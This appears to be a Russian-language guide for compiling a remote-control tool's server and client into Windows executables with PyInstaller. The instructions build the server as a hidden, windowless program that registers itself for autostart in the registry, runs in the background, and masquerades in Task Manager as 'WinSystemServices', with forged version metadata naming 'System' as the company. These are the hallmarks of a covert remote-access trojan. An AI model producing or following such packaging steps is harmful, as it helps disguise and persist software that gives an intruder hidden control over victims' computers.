# =============================================================================
# ИНСТРУКЦИЯ ПО КОМПИЛЯЦИИ В EXE
# =============================================================================

## Установка зависимостей

```bash
pip install pyinstaller pyautogui Pillow PyQt5
```

## Компиляция сервера (без окна)

```bash
pyinstaller --onefile --windowed --name=WinSystemServices server.py
```

## Компиляция клиента (с окном)

```bash
pyinstaller --onefile --name=RemoteControlClient client.py
```

## Результат

Файлы появятся в папке `dist/`:
- `dist/WinSystemServices.exe` - сервер (скрытый)
- `dist/RemoteControlClient.exe` - клиент (с интерфейсом)
Программа:
1. Добавится в автозапуск (реестр HKCU\Run)
2. Будет работать в фоновом режиме (без окна консоли)
3. Называется в диспетчере задач как WinSystemServices

## Проверка автозапуска

После первого запуска можете проверить реестр:
1. Нажмите Win + R
2. Введите: `regedit`
3. Перейдите: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
4. Там должен быть ключ `WinSystemHost` с путём к exe-файлу

## Удаление из автозапуска

Чтобы удалить из автозапуска, удалите ключ реестра:
```python
import winreg
key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run",
    0,
    winreg.KEY_WRITE
)
winreg.DeleteValue(key, "WinSystemHost")
winreg.CloseKey(key)
```

## Дополнительные опции PyInstaller

### Скрытый импорт (если pyautogui не работает в exe)
```bash
pyinstaller --onefile --windowed --name=WinSystemServices --hidden-import=pyautogui --hidden-import=PIL server.py
```

### Указание версии (для информации в exe)
```bash
pyinstaller --onefile --windowed --name=WinSystemServices --version-file=version_info.txt server.py
```

Где version_info.txt:
```
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1,0,0,0),
    prodvers=(1,0,0,0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
        StringTable(
          u'040904E4',
          [
            StringStruct(u'FileVersion', u'1.0.0.0'),
            StringStruct(u'ProductName', u'WinSystemServices'),
            StringStruct(u'CompanyName', u'System'),
            StringStruct(u'LegalCopyright', u'System')
          ]
        )
      ]
    )
  ]
)
```